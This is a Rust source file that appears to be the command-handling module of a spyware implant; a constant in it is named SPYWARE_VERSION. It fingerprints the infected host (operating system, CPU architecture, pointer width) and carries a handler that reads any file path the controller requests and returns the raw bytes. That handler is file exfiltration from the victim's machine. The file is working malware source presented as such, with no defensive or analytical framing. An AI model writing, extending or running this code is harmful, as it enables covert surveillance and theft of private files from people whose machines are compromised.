use crate::communication::messages::{
    Architecture, DownloadFileRequest, DownloadFileResponse, ErrorInfo, GetBasicInfoResponse,
    OperatingSystem, PointerWidth,
};
use log::{debug, error};
use std::io::Read;

// This method of getting the target OS is cool because:
//  -The binary won't include all of this logic
//  -Won't compile for any other OS until implemented.
#[cfg(target_os = "windows")]
fn get_target_os() -> OperatingSystem {
    OperatingSystem::Windows
}
#[cfg(target_os = "linux")]
fn get_target_os() -> OperatingSystem {
    OperatingSystem::Linux
}
#[cfg(target_os = "macos")]
fn get_target_os() -> OperatingSystem {
    OperatingSystem::MacOS
}
#[cfg(target_os = "ios")]
fn get_target_os() -> OperatingSystem {
    OperatingSystem::IOS
}
#[cfg(target_os = "android")]
fn get_target_os() -> OperatingSystem {
    OperatingSystem::Android
}
#[cfg(target_os = "freebsd")]
fn get_target_os() -> OperatingSystem {
    OperatingSystem::FreeBSD
}

#[cfg(target_arch = "x86")]
fn get_arch() -> Architecture {
    Architecture::x86
}
#[cfg(target_arch = "x86_64")]
fn get_arch() -> Architecture {
    Architecture::x86_64
}
#[cfg(target_arch = "mips")]
fn get_arch() -> Architecture {
    Architecture::mips
}
#[cfg(target_arch = "powerpc")]
fn get_arch() -> Architecture {
    Architecture::powerpc
}
#[cfg(target_arch = "powerpc64")]
fn get_arch() -> Architecture {
    Architecture::powerpc64
}
#[cfg(target_arch = "arm")]
fn get_arch() -> Architecture {
    Architecture::arm
}
#[cfg(target_arch = "aarch64")]
fn get_arch() -> Architecture {
    Architecture::aarch64
}

fn get_running_os_info() -> String {
    "To be implemented".to_string()
}

#[cfg(target_pointer_width = "32")]
fn get_pointer_width() -> PointerWidth {
    PointerWidth::Bit32
}
#[cfg(target_pointer_width = "64")]
fn get_pointer_width() -> PointerWidth {
    PointerWidth::Bit64
}

pub fn get_basic_info_request() -> GetBasicInfoResponse {
    debug!("Handling get basic info request");
    // TODO implement versions for real
    const SPYWARE_VERSION: u32 = 1;
    GetBasicInfoResponse {
        version: SPYWARE_VERSION,
        arch: get_arch(),
        target_os: get_target_os(),
        operating_system_version: get_running_os_info(),
        pointer_width: get_pointer_width(),
        error_info: None,
    }
}

pub fn download_file_message(request: DownloadFileRequest) -> DownloadFileResponse {
    debug!("Handling download file request: path \"{}\"", request.path);
    // TODO this assumes the file is UTF-8 encoded, we want to download binary files too.
    match std::fs::File::open(&request.path) {
        Ok(mut file) => {
            let mut buffer = Vec::new();
            file.read_to_end(&mut buffer).unwrap();
            DownloadFileResponse {
                file_data: buffer,
                error_info: None,
            }
        }
        Err(err) => {
            error!(
                "Could not read file \"{}\", error \"{}\"",
                request.path,
                err.to_string()
            );
            DownloadFileResponse {
                file_data: vec![],
                error_info: Some(ErrorInfo {
                    raw_os_error: err.raw_os_error().unwrap_or(-1),
                    as_string: err.to_string(),
                }),
            }
        }
    }
}
